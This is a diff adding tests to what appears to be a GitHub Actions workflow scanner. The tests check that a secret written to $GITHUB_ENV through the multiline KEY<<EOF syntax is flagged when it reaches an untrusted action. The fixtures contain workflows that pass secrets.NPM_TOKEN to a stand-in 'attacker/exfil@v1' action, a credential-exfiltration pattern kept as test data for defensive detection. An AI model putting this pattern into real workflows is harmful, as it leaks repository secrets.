@@ -361,3 +361,79 @@ def test_expression_scoped_grammar_has_no_plain_text_false_positive(
     assert not any(
         h.sink_kind in ("untrusted_action", "run_block") for h in hits
     )
+
+
+# ---------------------------------------------------------------------------
+# GitHub's documented multiline env-file syntax — KEY<<DELIM framing
+# ---------------------------------------------------------------------------
+
+_ENVFILE_GROUPED_WF = """
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          { echo "TOK<<EOF"; echo "${{ secrets.NPM_TOKEN }}"; echo "EOF"; } >> $GITHUB_ENV
+      - uses: attacker/exfil@v1
+        with:
+          token: ${{ env.TOK }}
+"""
+
+_ENVFILE_PER_LINE_WF = """
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "TOK<<EOF" >> $GITHUB_ENV
+          echo "${{ secrets.NPM_TOKEN }}" >> $GITHUB_ENV
+          echo "EOF" >> $GITHUB_ENV
+      - uses: attacker/exfil@v1
+        with:
+          token: ${{ env.TOK }}
+"""
+
+_ENVFILE_BENIGN_WF = """
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          { echo "NOTE<<EOF"; echo "release notes"; echo "EOF"; } >> $GITHUB_ENV
+      - uses: attacker/exfil@v1
+        with:
+          note: ${{ env.NOTE }}
+"""
+
+
+def test_envfile_multiline_grouped_write_taints_downstream_sink(
+    tmp_path: Path,
+) -> None:
+    """``KEY<<DELIM`` written to ``$GITHUB_ENV`` in one grouped
+    block is GitHub's OWN documented multiline env-file syntax —
+    the downstream untrusted-action sink on ``env.KEY`` must fire,
+    not just the write step's run_block."""
+    _write_wf(tmp_path, "envfile-group.yml", _ENVFILE_GROUPED_WF)
+    hits = scan_target(tmp_path)
+    assert any(h.sink_kind == "untrusted_action" for h in hits)
+
+
+def test_envfile_multiline_per_line_write_taints_downstream_sink(
+    tmp_path: Path,
+) -> None:
+    """Same framing spelled as three separate appends (the shape the
+    GitHub docs show)."""
+    _write_wf(tmp_path, "envfile-lines.yml", _ENVFILE_PER_LINE_WF)
+    hits = scan_target(tmp_path)
+    assert any(h.sink_kind == "untrusted_action" for h in hits)
+
+
+def test_envfile_multiline_without_secret_does_not_taint(
+    tmp_path: Path,
+) -> None:
+    _write_wf(tmp_path, "envfile-benign.yml", _ENVFILE_BENIGN_WF)
+    hits = scan_target(tmp_path)
+    assert not any(h.sink_kind == "untrusted_action" for h in hits)
